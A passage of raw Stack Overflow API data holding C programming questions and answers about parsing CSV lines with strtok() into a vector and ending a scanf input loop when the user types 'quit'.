  int cnt;\n    switch (scanf(\"%d\", &amp;number_of_iterations)) {\n        case 1: consume_line(); break;\n        case 0: consume_line(); /* Decide if code should re-try reading, etc. */ break;\n        case EOF:\n            printf(\"hello\");// Decide what to do if End-Of-File or rare Low-Level-Input-Error occurred.\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "strtok"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 3, "creation_date": 1551912752, "post_id": 55033409, "comment_id": 96819388, "body": "<a href=\"https://stackoverflow.com/q/5431941/918959\"><code>while (!feof(...))</code> is always wrong</a>"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1551917464, "post_id": 55033409, "comment_id": 96820750, "body": "<code>strtok()</code> is unusable. In the case of .csv files it will fail to detect consecutive delimiters <code>...,a,,c,...</code> emptyfields."}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551913230, "post_id": 55033449, "comment_id": 96819578, "body": "strdup(token) seems to still be filling my vector with garbage values."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551913342, "post_id": 55033449, "comment_id": 96819616, "body": "@user3357738 look my last edit, where <code>token = strtok(NULL, &quot;,&quot;);</code> is moved <i>after</i> the push. Of course you also need to change the way you use the values from the vector because there is one level less (a <code>char*</code> rather than a <code>char**</code> like before)"}, {"owner": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551913618, "post_id": 55033449, "comment_id": 96819713, "body": "your edit still prints both the date and the number at that date, however:          <code>char* token = strtok(singleLine, &quot;,&quot;);          token = strtok(NULL, &quot;,&quot;);          printf(&quot;%s\\n&quot;, token);          vc_vector_push_back(prices, strdup(token));</code>   does print just the numbers, still pushes garbage to my vector though."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551913720, "post_id": 55033449, "comment_id": 96819743, "body": "@user3357738 you print the addresses of the <code>char*</code>, <i>prices</i> <b>does not contains <i>int</i></b>, see my answer (again edited)"}, {"owner": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551914365, "post_id": 55033449, "comment_id": 96819952, "body": "hmm... <code>printf(&quot;%s\\n &quot;, (char*)i);</code> prints SOME of the values, but attaches a lot of garbage to them and other values are just still pure garbage, am I still printing wrong? I am going to edit above what the function now looks like."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551914425, "post_id": 55033449, "comment_id": 96819974, "body": "@user3357738 wait, I am modifying my answer, that of vector is strange, please wait a little ..."}, {"owner": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "edited": false, "score": 0, "creation_date": 1551914663, "post_id": 55033449, "comment_id": 96820045, "body": "I think it is outputting the right values on second look, just with lots of extra decimals (which is fine, I thankfully at least know enough C to handle that down the line), thanks for the help!"}], "tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": true, "score": 2, "last_activity_date": 1551914677, "last_edit_date": 1551914677, "creation_date": 1551912600, "answer_id": 55033449, "question_id": 55033409, "link": "https://stackoverflow.com/questions/55033409/strtok-for-csv-file-printing-null-along-with-desired-value/55033449#55033449", "title": "strtok() for CSV file printing (null) along with desired value", "body": "<p>In</p>\n\n<blockquote>\n<pre><code>   char* token = strtok(singleLine, \",\");\n   while (token != NULL) {\n       token = strtok(NULL, \",\");\n       printf(\"%s\\n\", token);\n       vc_vector_push_back(prices, &amp;token);\n   }\n</code></pre>\n</blockquote>\n\n<p><code>vc_vector_push_back</code>  allows to save data having a given size, not a variable size, so you can use it only if you created the vector indicating the number of characters you will put in</p>\n\n<p>In your case you do <code>vc_vector_push_back(prices, &amp;token);</code> so you finally will save at least the address of the string memorized in <em>token</em>, this is wrong, you need to save the characters inside the string :</p>\n\n<pre><code>    char* token = strtok(singleLine, \",\");\n    while (token != NULL) {\n        token = strtok(NULL, \",\");\n        printf(\"%s\\n\", token);\n        vc_vector_push_back(prices, token);\n    }\n</code></pre>\n\n<p>it is useless to duplicate <em>token</em> (as I imagined first) because <code>vc_vector_push_back</code> will do the copy depending on the size you indicated when you created the vector</p>\n\n<p>Note you also loose the first token and you will finally push NULL, probably you want</p>\n\n<pre><code>    char* token = strtok(singleLine, \",\");\n    while (token != NULL) {\n        printf(\"%s\\n\", token);\n        vc_vector_push_back(prices, token);\n        token = strtok(NULL, \",\");\n    }\n</code></pre>\n\n<p>In</p>\n\n<blockquote>\n<pre><code> for (void* i = vc_vector_begin(prices);\n      i != vc_vector_end(prices);\n      i = vc_vector_next(prices, i)) {\n      printf(\"%u; \", *(int*)i);\n }\n</code></pre>\n</blockquote>\n\n<p>you suppose <em>prices</em> contains <em>int</em> but this is false, it contains <code>char*</code>, must be</p>\n\n<pre><code>  for (void* i = vc_vector_begin(prices);\n       i != vc_vector_end(prices);\n       i = vc_vector_next(prices, i)) {\n       printf(\"%s \", *(char**)i);\n  }\n</code></pre>\n\n<hr>\n\n<p>You also need to change</p>\n\n<pre><code>while(!feof(fp)){\n    fgets(singleLine, 20, fp);\n</code></pre>\n\n<p>by something like</p>\n\n<pre><code>while (fgets(singleLine, 20, fp) != NULL) {\n</code></pre>\n\n<p>I also encourage you to check the value of <code>fopen(...)</code> before to use it</p>\n"}, {"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1551915132, "last_edit_date": 1551915132, "creation_date": 1551914751, "answer_id": 55033791, "question_id": 55033409, "link": "https://stackoverflow.com/questions/55033409/strtok-for-csv-file-printing-null-along-with-desired-value/55033791#55033791", "title": "strtok() for CSV file printing (null) along with desired value", "body": "<blockquote>\n  <p>When I print out the results of strtok() I get the numbers I am\n  looking for, but I also get (null) printed with them:</p>\n</blockquote>\n\n<p>Yes, because you loop until you do.  Consider:</p>\n\n<blockquote>\n<pre><code>        while (token != NULL) {\n            token = strtok(NULL, \",\");\n            printf(\"%s\\n\", token);\n            vc_vector_push_back(prices, &amp;token);\n        }\n</code></pre>\n</blockquote>\n\n<p>As long as the initial token is not NULL, on every iteration you read and then print the next token.  Only then, after already having printed it, do you loop back to test whether it is null.</p>\n\n<p>Since you seem to want exactly the second token of every line, it's pointless to loop.  Just call <code>strtok()</code> twice:</p>\n\n<pre><code>        char* token = strtok(singleLine, \",\\n\");\n\n        if (token) {\n            token = strtok(NULL, \",\\n\");\n            if (token) {\n                printf(\"%s\\n\", token);\n                vc_vector_push_back(prices, &amp;token);  // but see below\n            } // else handle malformed data\n        } // else handle malformed data\n</code></pre>\n\n<blockquote>\n  <p>Also, while I am here, quick side question, is <code>free(token)</code>; needed at\n  some point? Or no because <code>malloc()</code> was never called?</p>\n</blockquote>\n\n<p>No, because, as you say, no memory was allocated.  But think carefully about the implications.  No memory is allocated because <code>token</code> points into the <em>local</em> array <code>singleLine</code> that you are tokenizing.  That means:</p>\n\n<ol>\n<li>When you read the next line into the same buffer, you replace the pointed-to data.</li>\n<li>When the function returns, the lifetime of that array ends, rendering any pointers (in)to it invalid.</li>\n</ol>\n\n<p>It appears that <code>vc_vector</code> copies elements in, but in your case it can only be copying the pointers themselves, not the pointed-to values, so that doesn't help at all with either of the above.  Instead, to avoid corrupting your data and ultimately having a vector full of dangling pointers, you must make dynamically-allocated copies of the token strings, and store pointers to <em>those</em> in your vector.</p>\n\n<p>If you have it, then the non-standard, but common, <code>strdup()</code> function can make such copies for you.  Otherwise a combination of <code>strlen()</code>, <code>malloc()</code>, and <code>strcpy()</code> will do the same job.  Note that even though there is no explicit call to an allocation function when you use <code>strdup()</code>, on success, the resulting duplicate string is indeed dynamically allocated, needing to be freed when you no longer want it.</p>\n\n<blockquote>\n  <p>Also, when I try and print the actual vector entires, they just print out garbage </p>\n</blockquote>\n\n<p>Well <em>that's</em> because you're storing pointers to character arrays in your vector, but then trying to interpret them as if they were pointers to <code>int</code>.  The pointer formats are probably compatible, but the data they point to are totally not.  And type <code>int</code> isn't even an appropriate type, since your data are not integral (unless you can and do convert to a fixed-point representation).  Perhaps, instead of duplicating the strings, you want to use, and allow the vector to copy, <code>double</code>s:</p>\n\n<pre><code>double d = strtod(token, NULL);  // note: as written, performs no error checking\nvc_vector_push_back(prices, &amp;d);\n</code></pre>\n\n<p>That might require a change to the way you initialize the vector.  You would then print them as doubles, say:</p>\n\n<pre><code>for (double *dp = vc_vector_begin(prices);\n        dp != vc_vector_end(prices);\n        dp = vc_vector_next(prices, dp)) {\n     printf(\"%.2f; \", *dp);\n}\n</code></pre>\n"}], "owner": {"reputation": 57, "user_id": 3357738, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10a5e6e974337047a881ea31cda53d61?s=128&d=identicon&r=PG&f=1", "display_name": "user3357738", "link": "https://stackoverflow.com/users/3357738/user3357738"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 242, "favorite_count": 0, "accepted_answer_id": 55033449, "answer_count": 2, "score": -1, "last_activity_date": 1551915132, "creation_date": 1551912417, "last_edit_date": 1551914589, "question_id": 55033409, "link": "https://stackoverflow.com/questions/55033409/strtok-for-csv-file-printing-null-along-with-desired-value", "title": "strtok() for CSV file printing (null) along with desired value", "body": "<p>I'm trying to read a CSV file in C and store that data into a <a href=\"https://github.com/skogorev/vc_vector\" rel=\"nofollow noreferrer\">vector</a>.</p>\n\n<p>My CSV file entries for each line looks like: <code>12/12/1914, 52.4</code>, however, I am only interested in retrieving the number from this CSV, not the dates. \nTo accomplish this, I've been trying to read the file line by line using <code>fgets()</code> , and then separating the number value out through the use of <code>strtok()</code>. </p>\n\n<p>When I print out the results of <code>strtok()</code> I get the numbers I am looking for, but I also get <code>(null)</code> printed with them: </p>\n\n<pre><code>(null)\n25798.42\n\n(null)\n25706.68\n\n(null)\n25379.45\n\n(null)\n25444.34\n\n(null)\n25317.41\n</code></pre>\n\n<p>Also, when I try and print the actual vector entires, they just print out garbage (I assume this is because <code>(null)</code> is attached to them but not positive): </p>\n\n<pre><code>3907216808; 0; \n3907216808; 0; \n</code></pre>\n\n<p>My function for reading the data looks like this:</p>\n\n<pre><code>void get_CSV_data(vc_vector* prices)\n{\n    FILE *fp = fopen(_FILE_PATH, \"r\");\n    char singleLine[20];\n\n    while(!feof(fp)){\n        fgets(singleLine, 20, fp);\n\n        char* token = strtok(singleLine, \",\");\n        while (token != NULL) {\n            token = strtok(NULL, \",\");\n            printf(\"%s\\n\", token);\n            vc_vector_push_back(prices, &amp;token);\n        }\n    }\n    // Print each vector element\n    for (void* i = vc_vector_begin(prices);\n         i != vc_vector_end(prices);\n         i = vc_vector_next(prices, i)) {\n         printf(\"%u; \", *(int*)i);\n    }\n}\n</code></pre>\n\n<p>I assume I am using <code>strtok()</code> incorrectly, can anyone advise? \nAlso, while I am here, quick side question, is <code>free(token);</code> needed at some point? Or no because <code>malloc()</code> was never called? Still pretty new to C.</p>\n\n<p>EDIT: My function now looks like:</p>\n\n<pre><code>    void get_CSV_data(vc_vector* prices)\n{\n    FILE *fp = fopen(_FILE_PATH, \"r\");\n    char singleLine[20];\n\n    while(fgets(singleLine, 20, fp) != NULL){\n        char* token = strtok(singleLine, \",\");\n        token = strtok(NULL, \",\");\n        //printf(\"%s\\n\", token);\n        vc_vector_push_back(prices, strdup(token));\n\n\n    }\n    // Print each vector element\n    for (void* i = vc_vector_begin(prices);\n         i != vc_vector_end(prices);\n         i = vc_vector_next(prices, i)) {\n         printf(\"%s\\n \", (char*)i);\n    }\n}\n</code></pre>\n\n<p>I get results like:</p>\n\n<pre><code>25598.7425052.8325339.9925250.5525798.4225706.6825379.4525444.3425317.4125191.43    25052.8325339.9925250.5525798.4225706.6825379.4525444.3425317.4125191.43\n25339.9925250.5525798.4225706.6825379.4525444.3425317.4125191.43\n25250.5525798.4225706.6825379.4525444.3425317.4125191.43\n25798.4225706.6825379.4525444.3425317.4125191.43\n25706.6825379.4525444.3425317.4125191.43\n25379.4525444.3425317.4125191.43\n</code></pre>\n\n<p>Which are correct.</p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1551912603, "post_id": 55033405, "comment_id": 96819320, "body": "Are you required by specifications on an exercise you&#39;re doing to use <code>scanf</code>? If not, I&#39;d recommend another method."}, {"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "reply_to_user": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1551912749, "post_id": 55033405, "comment_id": 96819386, "body": "@GovindParmar yeah, I have to use scanf, we can&#39;t use anything we haven&#39;t learned yet."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1551912964, "post_id": 55033405, "comment_id": 96819483, "body": "@UnholySheep no it isn&#39;t. it is a scanning format for a string that consists of any characters besides newline, followed by literal <code>c</code>."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1551913468, "post_id": 55033405, "comment_id": 96819656, "body": "Why are you using <code>scanf(&quot;%[^\\n]c&quot;, string);</code> instead of <code>fgets (string, sizeof string, stdin)</code>?  (and then <code>strncmp (string, &quot;quit&quot;, 4);</code>)"}, {"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1551913555, "post_id": 55033405, "comment_id": 96819689, "body": "@DavidC.Rankin This is part of a school assignment and I can&#39;t use anything that hasn&#39;t been taught yet, so I have to use scanf"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1551913595, "post_id": 55033405, "comment_id": 96819704, "body": "Then what about <code>scanf(&quot; %[^\\n]%*c&quot;, string);</code>? (the <code>&#39;*&#39;</code> being the <i>assignment suppression operator</i> allowing the next character (e.g. <code>%c</code>) to be read and disregarded without affecting the returned <i>conversion count</i>. (which you should be checking <code>if (scanf(&quot; %[^\\n]%*c&quot;, string) != 1) { &#47;* handle error *&#47; }</code>)"}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1551913790, "post_id": 55033405, "comment_id": 96819767, "body": "Hi @anon. You should explain what you think <code>&quot;%[^\\n]c&quot;</code> means."}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1551913986, "post_id": 55033405, "comment_id": 96819833, "body": "@AnttiHaapala: It doesn&#39;t really mean that. The <code>%[^\\n]</code> will leave the <code>\\n</code> in the input stream. So, the next character cannot be a literal <code>c</code>."}, {"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1551914031, "post_id": 55033405, "comment_id": 96819853, "body": "@DavidC.Rankin hmmm, I really appreciate the fix, thank you so much but again I haven&#39;t been taught that technique, so I have to do it in a simpler way. Is there a way maybe to do while(1) and then inside the loop do if(strcmp(string,&quot;quit&quot;)!=0) break; I&#39;ve tried so many permutations, I can&#39;t figure out how to make it work."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1551914076, "post_id": 55033405, "comment_id": 96819863, "body": "@jxh of course it is impossible to match the entire format, but that&#39;s what it means."}, {"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "reply_to_user": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1551914135, "post_id": 55033405, "comment_id": 96819887, "body": "@jxh it allows spaces in between words. If I didn&#39;t have it then it would stop at the first space, I think."}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1551914164, "post_id": 55033405, "comment_id": 96819896, "body": "@anon: But what did you want to accomplish with the trailing <code>c</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "edited": false, "score": 0, "creation_date": 1551914377, "post_id": 55033679, "comment_id": 96819957, "body": "I can&#39;t use memset, I haven&#39;t learned that yet in class :/. BUT, I initialized the array like you suggested and it worked without memset. Thank you so much!"}, {"owner": {"reputation": 644, "user_id": 6363580, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7SGK6.jpg?s=128&g=1", "display_name": "brothir", "link": "https://stackoverflow.com/users/6363580/brothir"}, "reply_to_user": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "edited": false, "score": 0, "creation_date": 1551914521, "post_id": 55033679, "comment_id": 96820006, "body": "@anon You can also just set every index in <code>string</code> to 0 using a <code>for</code> loop, but the task probably requires more than just that. Glad it was of use."}, {"owner": {"reputation": 644, "user_id": 6363580, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7SGK6.jpg?s=128&g=1", "display_name": "brothir", "link": "https://stackoverflow.com/users/6363580/brothir"}, "reply_to_user": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "edited": false, "score": 1, "creation_date": 1551915177, "post_id": 55033679, "comment_id": 96820196, "body": "@Joshua I was always partial to Integer Overflow Man, he was my favourite super hero. It&#39;s true that it runs that danger, but anon hasn&#39;t really specified the boundaries of the task he&#39;s given so I was just trying to give the simplest proposal to something that would work with the issue he seemed to be having. Memory safety didn&#39;t seem to be a part of that."}], "tags": [], "owner": {"reputation": 644, "user_id": 6363580, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7SGK6.jpg?s=128&g=1", "display_name": "brothir", "link": "https://stackoverflow.com/users/6363580/brothir"}, "is_accepted": false, "score": 1, "last_activity_date": 1551914029, "creation_date": 1551914029, "answer_id": 55033679, "question_id": 55033405, "link": "https://stackoverflow.com/questions/55033405/type-quit-to-quit-c-program/55033679#55033679", "title": "Type Quit to Quit C Program", "body": "<p>Is something like this acceptable?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n\n    char string[200] = {0};\n\n    printf(\"Enter a bunch of words: \");\n    do {\n        memset(string, 0, 200);\n        scanf(\"%s\", string);\n    } while (strcmp(string, \"quit\") != 0);\n\n    return 0;\n}\n</code></pre>\n\n<p>You haven't explained exactly what you intend to do with string, so it's difficult to give an answer. However, one thing to note is that you have to either do something to <code>string</code> (I've just zeroed it out here) in order for <code>strcmp</code> to recognize \"quit\", or scan substrings of <code>string</code>, because if everything is always appended then your string will be \"(...)quit\" which strcmp won't recognize as \"quit\".</p>\n\n<p>As a side note, always initialize your arrays or bad things could happen.</p>\n"}, {"tags": [], "owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "is_accepted": false, "score": 0, "last_activity_date": 1551916676, "last_edit_date": 1551916676, "creation_date": 1551915591, "answer_id": 55033902, "question_id": 55033405, "link": "https://stackoverflow.com/questions/55033405/type-quit-to-quit-c-program/55033902#55033902", "title": "Type Quit to Quit C Program", "body": "<p>Given the sparse explanation you have provided, the most straightforward change may be to modify your scan string to swallow the <code>\\n</code> instead of a theoretical <code>c</code> which is actually impossible:</p>\n\n<pre><code>        scanf(\"%[^\\n]\\n\", string);\n</code></pre>\n\n<p>To prevent buffer overflow, you should specify how much room your buffer has to store input:</p>\n\n<pre><code>        scanf(\"%199[^\\n]\\n\", string);\n</code></pre>\n\n<p>This is safe so long as you know the input will never surpass 199 characters. But, this is a weak assumption both in theory and practice. The characters past the 199 saved will get scanned as your next word on the next iteration, which would allow your program to quit unexpectedly if the input was 199 <code>.</code>s followed by the word <code>quit</code>. You need a more reliable way to scan to the rest of the line and discard it before reading the next line.</p>\n\n<p>You might be tempted to use another <code>%[...]</code> to capture the extra characters like this:</p>\n\n<pre><code>        scanf(\"%199[^\\n]%*[^\\n]\\n\", string);\n</code></pre>\n\n<p>However, this will fail for the common case where the input is less or equal to 199 characters. This is because <code>scanf</code> will fail if the conversion results in empty input. So, the <code>\\n</code> will remain jammed in the input.</p>\n\n<p>If you are limited to using <code>scanf</code>, then you will need to split the scanning into separate <code>scanf</code> calls so that the error and non-error scan for the rest of the line can be treated as the same outcome, leading to a second <code>scanf</code> to swallow the newline itself.</p>\n\n<pre><code>        scanf(\"%199[^\\n]%*[^\\n]\", string);\n        scanf(\"\\n\");\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "edited": false, "score": 0, "creation_date": 1551920420, "post_id": 55034025, "comment_id": 96821400, "body": "Wow! Thank you so much, I really appreciate all the details. I&#39;ve followed advice from a you and another user and my program quits once I type in quit. However, this has lead to a new problem since I didn&#39;t describe the purpose of my program so you guys answered what you assumed my program wanted, I&#39;m going to post a new question that explains more thoroughly what I want to do once I have the program quit."}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": true, "score": 4, "last_activity_date": 1551916954, "last_edit_date": 1551916954, "creation_date": 1551916559, "answer_id": 55034025, "question_id": 55033405, "link": "https://stackoverflow.com/questions/55033405/type-quit-to-quit-c-program/55034025#55034025", "title": "Type Quit to Quit C Program", "body": "<p>Your two biggest problems are two of the most common problems that plague new C programmers 